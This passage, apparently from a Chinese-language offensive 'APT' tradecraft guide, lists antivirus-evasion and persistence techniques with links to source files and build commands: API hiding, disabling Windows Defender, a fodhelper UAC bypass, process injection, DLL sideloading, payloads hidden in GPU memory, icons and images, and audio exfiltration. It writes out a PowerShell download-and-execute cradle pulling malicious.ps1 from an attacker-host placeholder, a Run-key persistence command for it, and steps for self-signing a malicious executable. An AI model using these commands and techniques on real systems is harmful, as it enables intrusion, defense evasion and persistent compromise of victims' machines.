x86_64-w64-mingw32-g++ 100MB.cpp -o 100MB.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

### 隐藏Windows API调用

[xor_function.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/xor_function.py)

```bash
python3 xor_function.py
```

[hide_api.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/hide_api.cpp)

```bash
i686-w64-mingw32-g++ hide_api.cpp -o hide_api.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -Wint-to-pointer-cast -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

### 哈希名称调用函数

[hash.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/hash.py)

[hash_function.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/hash_function.cpp)

```bash
i686-w64-mingw32-g++ hash_function.cpp -o hash_function.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -Wint-to-pointer-cast -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

### 禁用Windows Defender

[defender.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/defender.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 defender.cpp -o defender.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```bash
reg query "HKLM\Software\Policies\Microsoft\Windows Defender" /s
```

### fodhelper.exe绕过UAC

[fodhelper.exe绕过UAC](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/fodhelper.exe绕过UAC.cpp)

```bash
reg query "HKCU\Software\Classes\ms-settings\Shell\open\command"
whoami /priv
```

### 自定义实现GetModuleHandle

[gmh.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/gmh.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 gmh.cpp -o gmh.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

### 自定义实现GetProcAddress

[gpa.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/gpa.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 gpa.cpp -o gpa.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

### COFF注入

[malicious.c](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/malicious.c)

```bash
clang -c -o malicious.obj malicious.c
```

[coff.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/coff.cpp)

### .NET运行时托管

[MaliciousAssembly.cs](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/MaliciousAssembly.cs)

```bash
csc /target:library /out:MaliciousAssembly.dll MaliciousAssembly.cs
```

[CLRHost.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/CLRHost.cpp)

### 分离

[ModuleA.c](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/ModuleA.c)

```bash
x86_64-w64-mingw32-gcc -shared -o ModuleA.dll ModuleA.c
```

[MainProgram.c](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/MainProgram.c)

```bash
x86_64-w64-mingw32-gcc -o MainProgram.exe MainProgram.c
```

### 白加黑

[white+black.c](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/white+black.c)

```bash
x86_64-w64-mingw32-g++ -O2 white+black.c -o wb.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

### 远程加载

[download.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/download.cpp)

```bash
msfvenom -p windows/x64/messagebox TEXT='Hi,I am Snowwolf' TITLE='Ghost Wolf Lab' -f raw -o wolf.bin
x86_64-w64-mingw32-g++ -O2 download.cpp -o download.exe -mconsole -lwininet -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

### 无文件

1. 内存加载恶意代码

```bash
powershell -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://攻击者主机地址/malicious.ps1')"
```

2. 注册表持久化

```bash
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousScript" /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://攻击者主机地址/malicious.ps1')\"" /f
```

3. 进程注入

[进程注入](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/进程注入.cpp)

## 杂用技巧

### 签署恶意执行程序

```bash
makecert -r -pe -n "CN=Diy CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv DIY.pvk DIY.cer
certutil -user -addstore Root DIY.cer
makecert -pe -n "CN=Diy Cert" -a sha256 -cy end -sky signature -ic DIY.cer -iv DIY.pvk -sv DiyCert.pvk DiyCert.cer
pvk2pfx -pvk DiyCert.pvk -spc DiyCert.cer -pfx DiyCert.pfx
signtool sign /fd SHA256 /a /f DiyCert.pfx /t http://timestamp.digicert.com /v 恶意可执行程序.exe
```

### 环境秘钥

```bash
dir env:
```

[EnvKeyLoader.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/EnvKeyLoader.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 EnvKeyLoader.cpp -o EnvKeyLoader.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

### ShadowMove隐藏套接字连接

[sm.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/sm.cpp)

```bash
python3 -m http.server 8080
```

### 将有效载荷隐藏在GPU内存中

[GPUPayload.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/GPUPayload.cpp)

[GPU_ShellCode](https://github.com/H1d3r/GPU_ShellCode)

[GPUSleep](https://github.com/oXis/GPUSleep)

### 图标注入DLL

[malicious.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/malicious.cpp)

```bash
x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.cpp
```

Resource Hacker:

malicious.dll -> malicious.dll.ico

[IconInjector.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/IconInjector.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 IconInjector.cpp -o IconInjector.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lole32 -loleaut32 -luuid
```

更改任意文件或目录的图标为 malicious.dll.ico

### 音频传输数据

[Sound_Send.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/Sound_Send.cpp)

[Sound_Server.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/Sound_Server.cpp)

```bash
.\Sound_Send.exe "i am robot!"
.\Sound_Server.exe
```

### 有效载荷嵌入到图片

[image.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/image.py)

```bash
python3 -m venv Crypto
source bin/activate
./bin/pip3 install pycryptodome
./bin/pip3 install Pillow
./bin/python3 image.py
```

[image_output.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/image_output.py)

```bash
pyinstaller --onefile .\image_output.py
```

### 模拟Lazarus加载Shellcode

```bash
msfvenom -p windows/x64/messagebox TEXT='Hi,I am Lazarus.Give me your money!' TITLE='Ghost Wolf Lab' -f raw -o wolf.bin
```

[Lazarus.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/Lazarus.py)

```bash
python3 Lazarus.py -p wolf.bin
```

[Lazarus.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9D%82%E7%94%A8%E6%8A%80%E5%B7%A7/Lazarus.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 Lazarus.cpp -o Lazarus.exe -I/usr/share/mingw-w64/include/ -L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lrpcrt4
```
